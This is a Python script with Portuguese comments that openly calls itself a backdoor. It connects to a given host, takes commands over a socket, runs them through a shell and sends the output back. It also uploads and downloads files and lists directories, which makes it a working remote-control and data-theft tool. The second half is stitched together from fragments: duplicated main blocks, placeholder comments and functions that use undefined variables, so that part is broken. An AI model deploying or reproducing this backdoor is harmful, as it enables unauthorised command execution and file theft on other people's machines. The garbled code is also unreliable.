import socket
import subprocess
import sys
import argparse
import os

# Função para coletar informações do servidor e exibir/salvar
def collect_server_info(target_host, target_port):
    try:
        # Conecte-se ao servidor alvo
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_host, target_port))

        # Envie uma solicitação HTTP para obter informações do servidor
        s.send(b'GET / HTTP/1.1\r\nHost: ' + target_host.encode() + b'\r\n\r\n')

        # Receba a resposta
        response = s.recv(4096)
        info = response.decode()

        # Imprima as informações na tela
        print(info)

        # Salve as informações no arquivo "informacoes.txt"
        with open("informacoes.txt", 'a') as file:
            file.write(info + '\n')

        return s  # Retornar o socket para uso posterior

    except Exception as e:
        print(f"Erro ao conectar ao servidor: {str(e)}")
        return None  # Retornar None se ocorrer um erro

# Função para enviar um arquivo para o servidor
def send_file_to_server(socket, file_path):
    try:
        if not socket:
            print("Não foi possível enviar o arquivo. Socket não está definido.")
            return

        if not os.path.isfile(file_path):
            print(f"Arquivo {file_path} não encontrado.")
            return

        with open(file_path, 'rb') as file:
            file_data = file.read()
            socket.send(file_data)
            print(f"Arquivo {file_path} enviado com sucesso para o servidor.\n")
    except Exception as e:
        print(f"Erro ao enviar o arquivo: {str(e)}")

# Função para exibir um banner
def display_banner():
    banner = """
    ██████╗ ██╗   ██╗███████╗███╗   ██╗██╗   ██╗
    ██╔══██╗╚██╗ ██╔╝██╔════╝████╗  ██║██║   ██║
    ██████╔╝ ╚████╔╝ █████╗  ██╔██╗ ██║██║   ██║
    ██╔═══╝   ╚██╔╝  ██╔══╝  ██║╚██╗██║██║   ██║
    ██║        ██║   ███████╗██║ ╚████║╚██████╔╝
    ╚═╝        ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
    """
    print(banner)

def backdoor(target_host, target_port):
    display_banner()
    print("\nBem-vindo à Backdoor de Kira!\n")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((target_host, target_port))
        print(f"Conectado a {target_host}:{target_port}\n")
    except Exception as e:
        print(f"Erro ao conectar a {target_host}:{target_port}: {str(e)}")
        return
    
    while True:
        command = s.recv(1024).decode('utf-8')
        if command == 'exit':
            break
        elif command == 'get_server_info':
            print("\nColetando informações do servidor...\n")
            # Chame a função para coletar informações do servidor e exibir/salvar
            collect_server_info(target_host, target_port)
        elif command.startswith('execute '):
            try:
                command_to_execute = command.split(' ', 1)[1]
                print(f"\nExecutando comando no servidor: {command_to_execute}\n")
                process = subprocess.Popen(command_to_execute, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output, error = process.communicate()
                result = output + error
                s.send(result)
            except Exception as e:
                s.send(str(e).encode('utf-8'))
        elif command.startswith('upload '):
            try:
                file_to_upload = command.split(' ', 1)[1]
                with open(file_to_upload, 'rb') as file:
                    file_data = file.read()
                    s.send(file_data)
                    print(f"\nArquivo {file_to_upload} enviado com sucesso para o servidor.\n")
            except Exception as e:
                print(f"Erro ao enviar arquivo: {str(e)}")
        elif command.startswith('download '):
            try:
                file_to_download = command.split(' ', 1)[1]
                file_data = s.recv(4096)
                with open(file_to_download, 'wb') as file:
                    file.write(file_data)
                    print(f"\nArquivo {file_to_download} baixado com sucesso do servidor.\n")
            except Exception as e:
                print(f"Erro ao baixar arquivo: {str(e)}")
        elif command.startswith('list_files '):
            try:
                directory = command.split(' ', 1)[1]
                file_list = os.listdir(directory)
                file_list_str = "\n".join(file_list)
                s.send(file_list_str.encode('utf-8'))
            except Exception as e:
                s.send(str(e).encode('utf-8'))
    
    s.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Backdoor interativo para coletar informações do servidor.")
    parser.add_argument("host", help="IP de destino ou site")
    parser.add_argument("--port", type=int, help="Porta de destino (opcional)")
    parser.add_argument("--upload", help="Caminho do arquivo para upload")
    parser.add_argument("--destination", help="Tipo de destino (site ou IP:porta)")

    args, unknown = parser.parse_known_args()

    s = None  # Inicializar o socket como None

    # Verificar se o usuário forneceu a opção --destination
    if args.destination:
        destination = args.destination
        if ':' in destination:
            host, port = destination.split(':')
            port = int(port)
        else:
            host = destination
            port = None  # Porta não especificada

    elif args.port:
        # Se a opção --port for fornecida, use o IP e a porta especificados
        host = args.host
        port = args.port
    else:
        # Se não for fornecida uma porta nem a opção --destination, verifique se é um site e obtenha o IP
        try:
            ip = socket.gethostbyname(args.host)
            host = ip
        except socket.gaierror:
            # Se não for possível resolver o host, use o nome como URL
            host = args.host
            port = 80  # Porta HTTP padrão

    if args.upload:
        s = collect_server_info(host, port)  # Coletar informações e obter o socket

        if s:
            send_file_to_server(s, args.upload)  # Enviar o arquivo se o socket estiver definido
    else:
        s = backdoor(host, port)

    if s:
        s.close()  # Fechar o socket se estiver definido
        # ... (código anterior)

def add_custom_command(args, function):
    """
    Adiciona um novo comando associado a uma função.
    """
    parser.add_argument(args, action="store_true", help="Executa a função " + function.__name__)

    if args:
        if args[2:] not in command_functions:
            command_functions[args[2:]] = function
        else:
            print("Comando já existe.")

# Lista para armazenar comandos e funções associadas
command_functions = {}

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Backdoor interativo para coletar informações do servidor.")
    parser.add_argument("host", help="IP de destino ou site")
    parser.add_argument("--port", type=int, help="Porta de destino (opcional)")

    # Adiciona os comandos e suas funções associadas
    # ... (código anterior)

# Função para ping ao servidor
def ping_server():
    target_host = args.host
    target_port = port
    print(f"Ping no servidor {target_host}:{target_port}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Backdoor interativo para coletar informações do servidor.")
    parser.add_argument("host", help="IP de destino ou site")
    parser.add_argument("--port", type=int, help="Porta de destino (opcional)")

    # Adiciona os comandos e suas funções associadas
    add_custom_command("--ping", ping_server)

    args, unknown = parser.parse_known_args()

    s = None  # Inicializar o socket como None

    # Verificar se o usuário forneceu a opção --destination
    if args.port:
        # Se a opção --port for fornecida, use o IP e a porta especificados
        host = args.host
        port = args.port
    else:
        # Se não for fornecida uma porta, use a porta padrão
        port = 80  # Porta HTTP padrão

    command = None
    for arg in unknown:
        if arg in command_functions:
            command = arg
            break

    if not command:
        print("Comando não reconhecido.")
    else:
        # Executa a função associada ao comando
        command_functions[command]()

# ... (código posterior)
# ... (código anterior)

# Função para baixar um arquivo do servidor
def download_file(file_name, s):
    try:
        # Envia o comando de download para o servidor
        s.send(f'download {file_name}'.encode())

        # Recebe os dados do arquivo do servidor
        file_data = s.recv(4096)

        # Salva os dados em um arquivo local
        with open(file_name, 'wb') as file:
            file.write(file_data)
        print(f"Arquivo {file_name} baixado com sucesso do servidor.")
    except Exception as e:
        print(f"Erro ao baixar o arquivo {file_name}: {str(e)}")

# Função para visualizar os arquivos no servidor e permitir o download
# ... (código anterior)

# Função para visualizar os arquivos no servidor e permitir o download
# ... (código anterior)
# Função para visualizar os arquivos no servidor e permitir o download
def view_files():
    try:
        # Envia o comando para listar os arquivos no servidor
        s.send('list_files .'.encode())

        # Recebe a lista de arquivos do servidor
        file_list_data = s.recv(4096)
        file_list = file_list_data.decode().split('\n')
        print("Arquivos no diretório:")
        for idx, file in enumerate(file_list):
            print(f"{idx + 1}. {file}")

        # Solicita ao usuário para escolher um arquivo para download
        choice = None
        while choice is None:
            choice_input = input("Digite o número do arquivo que deseja baixar (ou 'q' para sair): ")
            if choice_input.lower() == 'q':
                return
            try:
                choice = int(choice_input)
                if not (1 <= choice <= len(file_list)):
                    print("Escolha inválida.")
                    choice = None
            except ValueError:
                print("Escolha inválida. Use um número para escolher o arquivo.")

        selected_file = file_list[choice - 1]
        download_file(selected_file, s)
    except Exception as e:
        print(f"Erro ao visualizar os arquivos: {str(e)}")
        